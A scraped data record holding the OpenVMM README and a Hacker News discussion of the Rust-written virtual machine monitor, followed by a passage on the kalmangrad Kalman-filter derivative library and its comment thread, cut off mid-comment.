    "originBody": "OpenVMM OpenVMM is a modular, cross-platform, general-purpose Virtual Machine Monitor (VMM), written in Rust. For more information, read our guide or our introductory blog post. Getting Started For info on how to run, build, and use OpenVMM, check out the The OpenVMM Guide. The guide is published out of this repo via Markdown files. Please keep them up-to-date. Contributing This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com. When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA. This project has adopted the Microsoft Open Source Code of Conduct. For more information see the Code of Conduct FAQ or contact opencode@microsoft.com with any additional questions or comments. Trademarks This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow Microsoft's Trademark & Brand Guidelines. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party's policies.",
    "commentLink": "https://news.ycombinator.com/item?id=41866742",
    "commentBody": "OpenVMM – A New VMM for Windows and Linux, Written in Rust (github.com/microsoft)142 points by g0xA52A2A 13 hours agohidepastfavorite107 comments robjwells 8 hours agoNote this “disclaimer” in the guide: > In recent years, development efforts in the OpenVMM project have primarily focused on OpenHCL (AKA: OpenVMM as a paravisor). > As a result, not a lot of \"polish\" has gone into making the experience of running OpenVMM in traditional host contexts particularly \"pleasant\". > This lack of polish manifests in several ways, including but not limited to: […] > • No API or feature-set stability guarantees whatsoever. https://github.com/microsoft/openvmm/blob/main/Guide/src/use... reply solarkraft 6 hours agoparentPlus, for running as a paravisor: > OpenHCL currently relies on Hyper-V's implementation of Virtual Trust Levels (VTLs) to implement the security boundaries necessary reply nolist_policy 4 hours agorootparentOpenHCL is much more interesting than OpenVMM: Tl;Dr: Run the VM with only modern paravirtualized devices, then run OpenHCL inside the VM in ring -1 to emulate legacy devices and the guest os in ring 0 as usual. This is more secure, as the host only exposes paravirtualized devices with reduced attack surface to the guest. While still allowing to run legacy os. reply ericyd 5 hours agoprevThank God this VMM is written in Rust, otherwise I would be very skeptical. I don't care about features or purpose or technical advantages, give me Rust or give me death. reply Sytten 2 hours agoparentThose comments really are getting old. Each HN post with rust in the title seem to have that snarky comment that get a bunch of upvotes. I get that some people are annoyed, but can we stay on topic. As technologist we should strive to written better software, rust is a good tool for low-level components, that's it. reply jeroenhd 5 hours agoparentprevWhen it comes to low-level, security sensitive software like this, I actually do value the software being written in a relatively safe language. Could Rust, could be C# for all I care. reply hulitu 1 hour agorootparent> When it comes to low-level, security sensitive software like this, I actually do value the software being written in a relatively safe language. When it comes to low-level, security sensitive software like this, I actually do value the software being tested extensively. Bugs are bugs even if they are written in C, Rust, Ada, Elixir, Lisp or whatever language you like. reply sitkack 3 hours agorootparentprevRust's safety properties are vastly better than C#, memory safety is the barrier to entry. reply hulitu 1 hour agorootparent(i've heard) unless you use unsafe. /s reply mcflubbins 5 hours agoparentprevFor real, I find it so odd to tack on \"written in Rust\" to every new project that's announced that uses Rust. (As someone who uses Rust in their day job) reply RamRodification 5 hours agorootparentAs someone who does no programming at all, I can say that it kinda works. It makes me think \"Ok they have made a VMM again, but this time in that somehow safer programming language Rust. They probably know what they're doing so it will be just as good as the old one, only safer!\". I know enough to know that this is not necessarily true, but when I see these posts I always hope that it's true (and rely on people with the proper knowledge and experience to verify if it is or isn't). Then I go to the comments and there is often a discussion about how a rewrite will probably be less secure because it will introduce new bugs. But then maybe those will be fixed and eventually it will just be a more secure version. reply aniviacat 4 hours agorootparentprev\"Written in Rust\" to me implied that they're willing to go with a modern tech stack. When I see that a project is written in Rust I assume that beyond the language, their other technology/library/framework choices also tend torwards what is modern and unstable, rather than what is conventional and solid. That information is relevant to shaping one's view of a project. I think it makes sense to mention that you're using a modern stack. (Though Rust is already close to moving into the conventional/solid category.) reply estebank 3 hours agorootparentWhy is there a conflation between \"modern\" and \"unstable\", and \"conventional\" and \"solid\"? I've seen plenty of conventional things that are not solid, and plenty of modern things that were far from unstable. Or maybe I have a different threshold for what modern is. Beyond your parenthetical, what about Rust is unstable for you today? It would be interesting to me to hear that in order to see if the things that come to mind when hearing that are the same that you meant. reply Ar-Curunir 3 hours agorootparentprevTraditionally this would have been written in something like C, which, while conventional, is hardly solid in security-sensitive contexts like this one. reply tourmalinetaco 3 hours agorootparentprevI also tend to think “will lack long term support”, as I’ve seen many Rust projects where the OG devs move on to other projects. It’s fine to do that of course, but when I see “X but written in Rust” I read it as “I made this as an exercise” and not “I am making a full attempt to replace this other project”. reply lupusreal 2 hours agorootparentThat's my read too. The \"Written in X\" suffix to project announcements makes them sound like stunts done for attention or clout, regardless of the language used. It reads like a headline \"Man travels across America, with a unicycle.\" reply poincaredisk 5 hours agorootparentprevI consider a language mature, when it's developers stop feeling the need to list \"written in X\" in the features section of the repository/main page. reply orangeboats 4 hours agorootparentThat'd be a poor criteria. C++ is now an immature language: Comprehensive inter-process communication (IPC) toolkit in modern C++ (2024) https://news.ycombinator.com/item?id=40028118 reply wrs 2 hours agorootparentConsidering the continual revisions in C++ of fundamental things like pointers and strings, arguably this is not incorrect… reply kayo_20211030 4 hours agorootparentprevYou're right. It does smack a little bit of insecurity (phycological, not in the CS sense). But, \"blah blah blah `written by AI`\" transmits a different signal than \"blah blah blah `written in Rust`\", at least for now. reply systems 5 hours agorootparentprevbecause languages matter more than people like to admit yes you can write OOP in C , but please don't and you can write fp code in Java .. this one I am not so sure about, but I would say its still better to just use scala or clojure if you must JVM, and use just use ocaml and drop the no-tail-call-optimization-jvm the point is .. languages matter reply tonyedgecombe 8 hours agoprevIn case anybody else wondered VMM = Virtual Machine Monitor. reply winternewt 8 hours agoparentI read it as Virtual Memory Manager and wondered how the heck they pulled one off that works for both Windows and Linux. reply foundry27 6 hours agorootparentIt never even occurred to me that they could be talking about something other than the virtual memory manager. I was hyped to see if there was some new architecture being applied for cross-OS compatibility, novel memory objects, techniques to reduce fragmentation, stuff like that. Now I’m just sad. reply alias_neo 6 hours agoparentprevI knew what it stood for, but a pet peeve of mine in any form of engineering documentation (or frankly any technical documentation in any field) is not spelling out acronyms/initialisms on their first use; it was drilled into me in my degree; always spell out the first time you use a term on the assumption that the reader doesn't already know what any of it stands for. I both expect and don't expect this from Microsoft, but it makes me irrationally annoyed and I'm already feeling adversarial when reading something that does this in the first sentence no less. reply Vogtinator 5 hours agoprevCargo.lock has 8750 lines. Is that normal for something like this? For comparison, QEMU basically just needs glibc, glib and zlib for basic functionality. reply orangeboats 5 hours agoparentLooking at Cargo.toml, a great deal of the project's dependencies are internal dependencies. Those are located in the same repo, and the separation is only there to help keep the compile times manageable by allowing parallel compilation. It's very rare to see so many internal dependencies in one project, but the concept itself is well explored. But besides that, it's just the project making use of the Rust ecosystem instead of rolling everything by themselves. From what I can see most of these external dependencies are already established in the ecosystem (some crates I am not sure since I've never used them, but anyhow, http, hyper etc. are among the most popular crates). reply dicytea 4 hours agorootparent> the separation is only there to help keep the compile times manageable I don't think that's the reason, at least not the only reason. Workspaces is just a nice and modular way to organize a big project and separate concerns. reply pornel 4 hours agoparentprevCargo.lock is not ideal for this. It needs to be portable, and cover all kinds of builds and test runs, so it contains a superset of all dependencies for all platforms (recursively), as well as development-only dependencies, and everything needed for all optional features. Running `cargo tree -e normal` gives a more realistic subset of what is actually used, and `cargo tree -e normal --no-default-features` gives you the \"basically just needs\" subset. Another thing to keep in mind that Rust projects are very often split into many small packages (from the same authors, published as part of the same project). That isn't more code or more dependencies, but merely delivering code not as one monolith, but as modular components. reply geodel 3 hours agoparentprevCargo.toml is more appropriate to check dependencies and that has 642 lines. Some of them maybe just for testing or project setup. Remove them all I think it still would leave you with few hundred dependencies. And that does not seem excessive for a Rust project specially from Microsoft. I mention Microsoft specifically because their Go projects are similarly excessive in dependencies even though higher quality Go projects do have fewer dependencies. reply gpm 2 hours agorootparentExternal dependencies only start on line 354 of that file, and end on line 503. The rest is internal dependencies (within the repository), and build config. It's a different metric all together though, since it doesn't show transitive dependencies only direct dependencies (and as you suggest it doesn't distinguish between actual dependencies and testing dependencies because it's a workspace cargo.toml). As someone else suggested, using a program like cargo tree is the most appropriate. It's also worth putting this in context that there's half a million lines of rust code in this repository. reply zokier 8 hours agoprevHow does this relate/compare to CloudHypervisor, another Rust based VMM that has been around for couple of years https://github.com/cloud-hypervisor/cloud-hypervisor reply pjmlp 7 hours agoparentThis one is written by Microsoft employees and used on Azure. reply efitz 3 hours agoprevHalf the user guide is empty. I want to understand what communication channel(s) it has from guest to host. It's not clear from the cut-and-paste support described in the VNC section of the manual, how this works and what other functionality might be supported. reply rwmj 7 hours agoprevSlides from Linux Plumbers talk about OpenHCL: https://lpc.events/event/18/contributions/1956/attachments/1... reply AlfredBarnes 5 hours agoprevRust was something i thought was a cute little language years ago, much like i thought python was. I didn't pay attention for like 2 years and it feels likes it's everywhere and everything. Time to learn. reply low_tech_love 9 hours agoprevI find it interesting that every single piece of software that was ever written in Rust always mentions that very proudly in its title. It's not something I see often with other programming languages (most software is just software and doesn't necessarily advertise the language it was built with). I do not know anything about Rust, so I'm just curious, does this confer a kind of underlying trustworthiness or quality to the application? reply rascul 6 hours agoparent> It's not something I see often with other programming languages Search HN stories for \"written in\", sort by date, and in the past couple weeks there are of course a number of \"written in rust\" but also c, python, ruby, go, c++, lisp, java, javascript, flutter, crystal, and react. Rust has the most instances currently but it's also common enough here with other languages. https://hn.algolia.com/?dateRange=all&page=0&prefix=false&qu... reply ericyd 5 hours agorootparentThis is interesting and clearly a true claim, but anecdotally I feel like the combination of 1) lands on HN homepage and 2) includes \"written in\" in the title is heavily biased towards Rust. I don't know how to search for those two qualifiers to prove or disapprove my feelings though. reply keybored 4 hours agorootparentI did a simpler count: the number of comments in this thread that either (without also talking about the content of the submission) (1) only talk about Rust (2) only talk about programming languages (3) talk about how programming language choice impacts the project or the quality of the software (or how it might not be a guarantee of those things) (4) talk about how a VMM being written in Rust/not being written in Rust is good (this last one is the closest to the submission topic but still not about the submission topic). 45/64. reply estebank 2 hours agorootparentIt wasn't until this comment that made me realize that using \"written in Rust\" as rage click bait is such a \"useful\" strategy here, because it will inevitably attract plenty of comments about the mentioning of the language. Ironically, the people complaining end up increasing the post's rank by engaging more. reply steveklabnik 6 minutes agorootparentIt can harm it too; if a thread here has more comments than upvotes, it's heavily penalized by the algorithm. I have seen good stories sometimes get buried because two early commentors get into a fight, before there's enough time to gain more upvotes. reply sirwhinesalot 9 hours agoparentprevDue to Rust's safety guarantees there's a perception that software written in Rust is automatically safer than software written in its direct competitors C and C++. This is not necessarily true, you can write unsafe Rust code and you can write safe C++ code, but it does seem to hold in practice that the guardrails imposed by Rust help quite a bit in stopping devs from making really stupid mistakes. That would be the \"thrustworthiness\" implied by the use of Rust. reply kstrauser 2 hours agorootparentFor myself only, there's also an implication that perhaps the authors are a bit more concerned with safety and security in general. (Don't reply with counterexamples. I know them already. I mean that as a trend, not a solid rule.) That is, the sort of person who might pick Rust for its features might correlate with the sort of person who cares more about those properties in the first place. That doesn't mean they're experts who can execute the ideas flawlessly, or that someone slogging in C couldn't carefully built the same project. I do think it means they're more likely to prioritize safety (yes, it's not 100% safe; yes, you can write insecure code in Rust; don't \"correct\" me) as an inherent design goal than maybe someone cranking it out in assembler. reply hulitu 11 minutes agorootparent> For myself only, there's also an implication that perhaps the authors are a bit more concerned with safety and security in general. (Don't reply with counterexamples. I know them already. I mean that as a trend, not a solid rule.) That is, the sort of person who might pick Rust for its features might correlate with the sort of person who cares more about those properties in the first place I haven't seen any causation between SW and their creator. A good example: Hans Reiser. reply bitexploder 6 hours agorootparentprevAnd a VMM is going to require a lot of unsafe rust code. There are strategies to minimize it to make that surface easier to audit, but it is not a panacea for systems programming gremlins. reply nicce 5 hours agorootparentIt is manager, not runner. Does it require that much unsafe? reply gpm 4 hours agorootparentOut of 413,842 non-empty lines of rust code in the repository (including comments) there are 2006 instances of \"unsafe\", 255 of which are of the form \"unsafe_\" (definitely not unsafe blocks, mostly of the form #![forbid(unsafe_code)] which is an instruction to the linter to forbid unsafe blocks in the module) leaving slightly less than 1751 unsafe blocks. (Still counting comments, and type signature annotations on function pointers, and so on, but most of those 1751 will be actual unsafe blocks. A block can of course be multiple lines of code). I don't really know what a VMM consists of, so I'm mostly surprised that this project is half a million lines of code. reply estebank 2 hours agorootparentFor this kind of analysis, https://github.com/geiger-rs/cargo-geiger comes in handy. reply gpm 2 hours agorootparentYeah, I tried that before resorting to just using `rg`, unfortunately this issue prevents it from working: https://github.com/geiger-rs/cargo-geiger/issues/523 reply sirwhinesalot 6 hours agorootparentprevNo question, just pointing out where the *perceived* trustworthiness comes from. If it helps for something like a VMM it's a whole other story. Marketing gimmick. reply monocasa 6 hours agorootparentprevA paravisor actually doesn't really need that much. reply Ygg2 5 hours agorootparentprevIt's not unsafe that causes unsafety, it's how you wield it. - Do you know your invariants? - Have you documented them? - If using unsafe block, have you asserted them or guaranteed that they hold for any input? Granted, Rust is kind of mediocre at teaching you this. It raises warning for unsafe fn without safety documentation block, but not when omittin safety comments in unsafe blocks. reply gpm 3 hours agorootparentFor what it's worth, clippy has an optional lint to detect undocumented unsafe blocks: https://rust-lang.github.io/rust-clippy/master/index.html#un... Edit: And it turns out it's enabled as a warning in this repo. reply hypeatei 7 hours agoparentprevI find it interesting that every single post which has \"written in Rust\" also has someone in the comments asking why every single Rust project advertises it was written in Rust. reply hulitu 7 minutes agorootparentMaybe people are sick of promisses. It is like talking about your car and saying that it is made of titanium and copper and composite materials while not saying anything about actual features (mileage, safety equipment). reply efitz 3 hours agorootparentprevThis comment was written in plain text. reply felbane 7 hours agorootparentprevIt's fascinating to me that every post which has \"written in Rust\" includes a comment pointing out the fact that someone in the comments always asks why every single Rust project advertises it was written in Rust. reply keybored 7 hours agorootparent(term simplification, halt loop) It’s fascinating that a forum full of technical people make comments that lampoon the meta commentary by making an nth-order meta comment. reply seanw444 3 hours agorootparentTechnical people have fun too. I think. reply keybored 3 hours agorootparentThis statement relies on self-reported inner state. It is inherently unreliable. ;) reply Y_Y 9 hours agoparentprevDo you not remember ten years ago when this was a thing with Python? It's an effective evangelism tactic. Super annoying, but it \"works\" in some sense. I consider it like \"YouTube face\", I tolerate it because even good projects or creators have to play the game to some extent or get washed away in the crapflood. reply Klonoar 7 hours agorootparentHN in particular has a long history of this kind of thing, e.g “Written in Ruby”. (Or if you’ve been around super long, “written in Lisp”.) reply tcfhgj 7 hours agorootparentprevI doubt that a GitHub README is used for language evangelism. If at all, it's project promotion. Also, I don't find it annoying, but helpful, because I care - amongst other things - about the language of open source software projects. reply Y_Y 7 hours agorootparent> I doubt that a GitHub README is used for language evangelism. Perhaps you should reconsider this. OpenVMM split up its docs and there isn't much in the actual README, but a few seconds investigation led me to https://github.com/microsoft/openvmm/blob/main/Guide/src/dev... , for example. > Also, I don't find it annoying, but helpful, because I care - amongst other things - about the language of open source software projects. Come on, this is not even a good strawman. It's very easy to find out the language of you want to know, and it's possible to inform without evangelism. reply tcfhgj 4 hours agorootparent> OpenVMM split up its docs and there isn't much in the actual README, but a few seconds investigation led me to https://github.com/microsoft/openvmm/blob/main/Guide/src/dev... , for example. this is a reason to reconsider my statement why? > Come on, this is not even a good strawman. It's not a straw man at all. It's my opinion. > It's very easy to find out the language of you want to know, and it's possible to inform without evangelism. Indeed, but nothing makes it more straight forward than the language being mentioned in the HN News title reply jeroenhd 5 hours agoparentprevI've also seen this done for C and modern C++. I believe it's done to suggest something (i.e. Rust is memory safe, C is usually fast, modern C++ is used to distinguish from the terrible old C++, Java runs on the JVM so it's relatively easy to use cross platform, Kotlin is for Java software that doesn't throw random null pointers every week, etc.) The same tokens are also used for stuff that is designed to run on bare metal/containers/kubernetes/\"\"\"serverless\"\"\". reply tupolef 7 hours agoparentprevIt may seem proselite and overly highlighted, but personally I find it very practical. Whenever I review a tool, or look for an alternative, I always look at the state of the maintenance and the choice of programming language, mainly to eliminate, as much as possible, the many tools written in Javascript and Python when it is not suitable. I will not necessarily prefer a tool written in Rust, but at least it is rarely a flaw. reply trumpeta 9 hours agoparentprevIt's meant to imply that it's as performant as, but safer than c/c++. reply bboozzoo 6 hours agorootparentBut not necessarily less buggy or more useful than the counterparts (if there even are any). reply kstrauser 2 hours agorootparentIt does imply there are likely to be different classes of bugs. If the thing compiles at all, someone's done the work to get the types right, and implement all the arms of match expressions, and written at least basic error handling. The errors are more likely to be high-level logic issues that you'd face in any code, not so much trivial implementation mistakes. reply mrweasel 4 hours agoparentprevThat was Go a 10 years ago, now it's Rust. Some people feel the need to talk loudly about their tools, which can be annoying, but also helps put it on the radar for the rest of us. Once we're aware of something we can assess it for ourselves and maybe we stick with it and maybe we go back to what we where doing before, or move on to the next thing. The Rust fans are pushing it a bit, I understand why they love the language, but I don't, so the insisting hammering on \"written in Rust\" can push me away from certain tools. In the end it will die down and the loudest will move on to the next language, once the Rust hype has been tapered out. reply osigurdson 5 hours agoparentprev\"Written in Rust\" is a brand that confers fast and safe. Like any brand, there is some truth to it but no rigorous guarantees. If Rust becomes more widely used that brand will likely start to fade. reply throwup238 5 hours agorootparentIt also confers “cargo install” if it’s an app. reply dijit 7 hours agoparentprevI agree, but if we tried to reason why: I would argue that it's because writing rust code that compiles is harder. We tend to ascribe significance to things that are percieved as difficult, back in the day for example a book was hugely important, so authors were revered, but now with the advent of easier access to printing presses an author is not similarly revered. Making small modules here and there, even if hard, is deemed less effort, and similarly gluing small modules together is deemed even less significant of an achievement, so what you're solving becomes much more important than how, since significance in the process is diminished. Since Rust is harder than C++ (making compiling software is easier, even if there's runtime errors after all) - we ascribe significance to the fact that it was used. reply INTPenis 8 hours agoparentprevI don't think it's any secret that Rust is a very hyped up language, has been for 5 years already. I've been saying for years now that if Rust was a stock, I'd be investing. Meaning, if I was a young programmer I would probably take the time to learn Rust, because it's going to be in high demand. reply justmarc 5 hours agoparentprevOne thing is for sure, it's going to help it be a more stable, robust piece of software, that's already a big deal. reply pjmlp 9 hours agoparentprevYes we do, just look at the years following up the introduction of XYZ language, be it on BBS, Compuserve, Prodigy, Usenet, Dejanews, or whatever is the main communications channel of the day. reply netbsdusers 8 hours agoparentprevIt's the in-thing at the moment so it certainly attracts attention. Make sure to claim to be \"Blazing fast [Rocket Emoji]\" in the README too for good measure. reply kreetx 6 hours agoparentprevIt seems as if the implementation detail is the feature. Can't the program stand for itself? reply acdha 5 hours agorootparentIt is a useful feature. We’ve had tons and tons of bugs caused by C/C++ misfeatures which is both why Rust was invented and why users are looking for more stable alternatives after decades on the patch of the week treadmill. A tool like this is aimed at a technical audience who will see the appeal of a tool which is safer and easier to work on. reply kreetx 4 hours agorootparentRight, but I suspect people would like to use it to run VMs rather than start developing it. If the indent is to invite developers who \"know rust\", then that is the wrong measuring bar (IMO, of course), as you'd want developers who are interested in hypervisors instead of a specific language. reply acdha 3 hours agorootparentAs a user of VMs, I would value memory safety because hypervisor exploits are nasty and patching is higher risk. reply kreetx 3 hours agorootparentNot disagreeing with you on the memory safety. It's just that the way \"written in Rust\" is used, it seems like a marketing gimmick to invite anyone who knows (or maybe wants to learn) Rust. Shows (IMO!) the weakness of the project rather than its seriousness. reply acdha 1 hour agorootparentI haven’t observed people taking that as a learning opportunity as opposed to an expression of a modern version of an existing tool which emphasizes safety. reply evanjrowley 5 hours agoparentprevPromotional PR tactics benefit programmers of non-mainstream languages by raising awareness, interest, the labor market, and hopefully professional jobs working on the particular technology. reply ordu 8 hours agoparentprev> It's not something I see often with other programming languages Lisp software also presented with \"Lisp\" in the title. Lisp programs are rarer, so you see \"Lisp\" in titles less frequently than \"Rust\" but I believe that any Lisp program proudly claims that it was written in Lisp. reply flanked-evergl 6 hours agoparentprevI saw this for go all the time a couple of years back. reply doublerabbit 8 hours agoparentprevI wait for the day when someone adds \"Written in COBOL\" to their HN project title. reply garblegarble 7 hours agorootparentTechnically somebody already has: https://news.ycombinator.com/item?id=24370792 reply roetlich 6 hours agorootparentAlso: https://news.ycombinator.com/item?id=23189918 Not literally \"in Cobol\" in the title, but almost. And in both cases the primary novelty is that it's written in Cobol. reply ravenstine 5 hours agoparentprevWhen something needs to be constantly emphasized, it makes me suspicious. The more I read \"[...] in Rust\", the less I will be surprised if Rust is considered harmful in another 5 to 10 years. reply oguz-ismail 7 hours agoparentprevIt's usually the only selling point. reply diego_moita 6 hours agoparentprevI take it as tribalism. Rust culture is a lot like socialism, libertarians, fundamentalist religions, vegans, etc. They see themselves apart from the \"mainstream\", as rebels, revolutionaries, etc. In their beginning, Java and Python were like that, too. Lua, Haskell and Kotlin also do the same. Golang is more discrete. reply monocasa 6 hours agorootparentI feel like \"written in Go\" is the at least the second most likely language to be pimped in an hn title. reply vrighter 5 hours agoprevit's written in rust is the only thing worth mentioning about it? congratulations on writing a thing that does something, i guess reply mrweasel 5 hours agoparentThe website states: \"OpenVMM is a modular, cross-platform, general-purpose Virtual Machine Monitor (VMM), written in Rust.\" I'd leave out the \"written in Rust\", because who cares, but I think it's in the license terms for Rust that you need to include that in when communication your project. The modular and cross-platform is much more interesting that the implementation language, and much more relevant for the majority of the users. I'd focus on that if I wrote the documentation and marketing material. One excuse I'd make is that the link is to the Github repository, where it's perhaps more relevant that you're informed that you'll be looking at Rust code. reply kayo_20211030 4 hours agorootparentIs that true? That the license requires the addition of \"written in Rust\" to announcements? I looked and couldn't find the requirement. But, agree generally with your points. reply gpm 3 hours agorootparentIt was a joke, rust is under a normal very permissive set of open source licenses (MIT or Apache2 at the users option) reply radiowave 3 hours agorootparentprevI think that might have been a joke. reply Ar-Curunir 3 hours agorootparentprevThat is a joke. reply kayo_20211030 3 hours agorootparentprevMy bad. Face palm. reply _0xdd 2 hours agoprevNice! Would be pretty cool if this supported bhyve on FreeBSD. reply hollerith 4 hours agoprevVMM == Virtual Machine Monitor, \"such as Hyper-V, QEMU, VirtualBox\". reply hulitu 13 minutes agoparent> VMM == Virtual Machine Monitor, \"such as Hyper-V, QEMU, VirtualBox\". So, can it run Windows 95 ? reply Dowwie 4 hours agoprevA New Virtual Machine Monitor for Windows and Linux that happens to be written in Rust reply kosolam 9 hours agoprev [–] A very interesting project. If I understand correctly it’s being used for Azure infrastructure. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "OpenVMM is a modular and cross-platform Virtual Machine Monitor (VMM) developed in the Rust programming language.",
      "Contributions to OpenVMM are encouraged, but most require signing a Contributor License Agreement (CLA), facilitated by a CLA bot during pull requests.",
      "The project adheres to the Microsoft Open Source Code of Conduct, and inquiries can be directed to opencode@microsoft.com."
    ],
    "commentSummary": [
      "OpenVMM is a new Virtual Machine Monitor (VMM) for Windows and Linux, developed in Rust, emphasizing safety features over traditional languages like C/C++.",
      "The project focuses on OpenHCL as a paravisor but lacks polish in traditional host contexts and does not guarantee API stability.",
      "OpenVMM is utilized by Microsoft employees and is integrated into Azure infrastructure, highlighting its significance in cloud computing environments."
    ],
    "points": 142,
    "commentCount": 107,
    "retryCount": 0,
    "time": 1729143726
  },
  {
    "id": 41863398,
    "title": "Automated smooth Nth order derivatives of noisy data",
    "originLink": "https://github.com/hugohadfield/kalmangrad",
    "originBody": "This little project came about because I kept running into the same problem: cleanly differentiating sensor data before doing analysis. There are a ton of ways to solve this problem, I&#x27;ve always personally been a fan of using kalman filters for the job as its easy to get the double whammy of resampling&#x2F;upsampling to a fixed consistent rate and also smoothing&#x2F;outlier rejection. I wrote a little numpy only bayesian filtering&#x2F;smoothing library recently (https:&#x2F;&#x2F;github.com&#x2F;hugohadfield&#x2F;bayesfilter&#x2F;) so this felt like a fun and very useful first thing to try it out on! If people find kalmangrad useful I would be more than happy to add a few more features etc. and I would be very grateful if people sent in any bugs they spot.. Thanks!",
    "commentLink": "https://news.ycombinator.com/item?id=41863398",
    "commentBody": "Automated smooth Nth order derivatives of noisy data (github.com/hugohadfield)137 points by hugohadfield 22 hours agohidepastfavorite39 comments This little project came about because I kept running into the same problem: cleanly differentiating sensor data before doing analysis. There are a ton of ways to solve this problem, I've always personally been a fan of using kalman filters for the job as its easy to get the double whammy of resampling/upsampling to a fixed consistent rate and also smoothing/outlier rejection. I wrote a little numpy only bayesian filtering/smoothing library recently (https://github.com/hugohadfield/bayesfilter/) so this felt like a fun and very useful first thing to try it out on! If people find kalmangrad useful I would be more than happy to add a few more features etc. and I would be very grateful if people sent in any bugs they spot.. Thanks! magicalhippo 4 hours agoLooks really cool. I stumbled over this[1] page recently, which has a method that's apparently is better than the \"traditional\" Savitzky-Golay filters. The idea seems to be to start with the desired frequency response, with lower frequencies close to the ideal differentiator, and higher frequencies tending smoothly to zero. This is then used to derive the filter coefficients through a set of equations. The author generalizes it to irregularly sampled data near the end, so would be interesting to compare the approaches. Just thought it'd throw it out there. [1]: http://www.holoborodko.com/pavel/numerical-methods/numerical... reply tarlinian 2 hours agoprevHow did you choose the process noise covariance in your `grad` function? It doesn't seem like a single process noise covariance structure should be globally applicable across all possible functions. reply jcgrillo 18 hours agoprevThis is great! I've taken sort of a passive interest in this topic over the years, some papers which come to mind are [1] and [2] but I don't think I've seen a real life example of using the Kalman filter before. [1] https://www.sciencedirect.com/science/article/abs/pii/002192... [2] https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=924... reply discretion22 1 hour agoparentI worked on air quality monitoring about 30 years ago and the equipment used a Kalman filter to remove measurement noise and give stability; it had been added to the software a number of years earlier by a mathematics student who was working as a summer job with the company. No-one in the team had heard of it before but it solved lots of the stability issues and was core to the system ever after. reply youoy 7 hours agoprevNice work! Just one quick question (maybe it's clear but I have not looked at it in depth). It says it computes the derivative for non-uniformly sampled time series data and the example image shows this. Is this also well behaved if the sampled measurements have noise (it is not the case of the example)? Or should one use a different approach for that? Thanks! reply hugohadfield 7 hours agoparentThanks! So the example image is actually with both non-uniformly sampled measurements and noise :) works great for both/either reply hugohadfield 7 hours agorootparentNoise is added here: ``` # Generate noisy sinusoidal data with random time points np.random.seed(0) t = sorted(np.random.uniform(0.0, 10.0, 100)) noise_std = 0.01 y = np.sin(t) + noise_std * np.random.randn(len(t)) true_first_derivative = np.cos(t) true_second_derivative = -np.sin(t) ``` changing noise_std will change the magnitude of the noise added, hope that helps! reply youoy 7 hours agorootparentAh true! Now I see it on the image too, I was looking at it on the phone and it did not look like it. I will definitely give it a try! Thank you very much reply hugohadfield 6 hours agorootparentno problem! reply fisian 13 hours agoprevGreat work! I would've needed this recently for some data analysis, to estimate the mass of an object based on position measurments. I tried calculating the 2nd derivative with a Savitzky-Golay filter, but still had some problems and ended up using a different approach (also using a Kalman filter, but with a physics-based model of my setup). My main problem was that I had repeated values in my measurements (sensor had a lower, non-integer divisible sampling rate than the acquisition pipeline). This especially made clear that np.gradient wasn't suitable, because it resulted in erratic switches between zero and the calculated derivative. Applying, np.gradient twice made the data look like random noise. I will try using this library, when I next get the chance. reply radarsat1 8 hours agoparentDid you try prefiltering to remove the repeated values? reply hugohadfield 7 hours agoparentprevThanks so much! Yeah this was also a key reason I like this approach. Quite often we end up with repeated values due to quantisation of signal or timing differences or whatever and we get exactly that problem you describe, either massive gradients or 0 gradient and nothing in betweeen. With the KF approach you can just strip out the repeated values and run the filter with them missing and its fine. In the quantisation case you can approximate the quantisation observation noise by using resolution*1/sqrt(12) and it also all just works nicely. If you have any sample data of some fun problems and don't mind sharing then let me know and we could add some demos to the library! reply brody_slade_ai 12 hours agoprevKalman Filter helped me understand the mathematical concepts that make it a powerful tool for estimating values from noisy data I made a simulation that forecasted a greenhouse's temperature and humidity to help me understand the idea. I began by going over the basics of Gaussians and normal distribution once more. After that, I used NumPy and SciPy to develop the Kalman Filter in Python. To represent the system, I defined noise matrices (Q and R), a state transition matrix (F), and a control input matrix (B). reply pm 21 hours agoprevCongratulations! Pardon my ignorance, as my understanding of mathematics at this level is beyond rusty, but what are the applications of this kind of functionality? reply thatcherc 19 hours agoparentI actually have one for this! Last week I had something really specific - a GeoTIFF image where each pixel represents the speed in \"x\" direction of the ice sheet surface in Antarctica and I wanted to get the derivative of that velocity field so I could look at the strain rate of the ice. A common way to do that is to use a Savitzky-Golay filter [0], which does a similar thing - it can smooth out data and also provide smooth derivatives of the input data. It looks like this post's technique can also do that, so maybe it'd be useful for my ice strain-rate field project. [0] - https://en.wikipedia.org/wiki/Savitzky%E2%80%93Golay_filter reply defrost 18 hours agorootparentI've been a heavy user of Savitzky-Golay filters (linear time series, rectangular grid images, cubic space domainsfirst, second and third derivitivesbalanced and unbalanced (returning central region smoothed values and values at edges)) since the 1980s. The usual implementation is as a convolution filter based on the premise that the underlying data is regularly sampled. The pain in the arse occassional reality is missing data and|or present but glitched|spiked data .. both of which require a \"sensible infill\" to continue with a convolution. This is a nice implementation and a potentially useful bit of kit- the elephant in the room (from my PoV) is \"how come the application domain is irregularly sampled data\"? Generally (engineering, geophysics, etc) great lengths are taken to clock data samples like a metronome (in time and|or space (as required most)). I'm assuming that your gridded GeoTIFF data field is regularly sampled in both the X and Y axis? reply thatcherc 5 hours agorootparentYup, my data is nicely gridded so I can use the convolution approach pretty easily. Agreed though - missing data at the edges or in the interior is annoying. For a while I was thinking I should recompute the SG coefficients every time I hit a missing data point so that they just \"jump over\" the missing values, giving me a derivative at the missing point based on the values that come before and after it, but for now I'm just throwing away any convolutions that hit a missing value. reply hugohadfield 6 hours agorootparentprevYeah regularly sampled is the goal almost always, and great when its available! The main times I deal with non-uniformly sampled data is with jitter and missing data etc reply pm 19 hours agorootparentprevThanks for that, it looks like my research today is cut out for me. reply hugohadfield 20 hours agoparentprevNo problem! Let's dream up a little use case: Imagine you have a speed sensor eg. on your car and 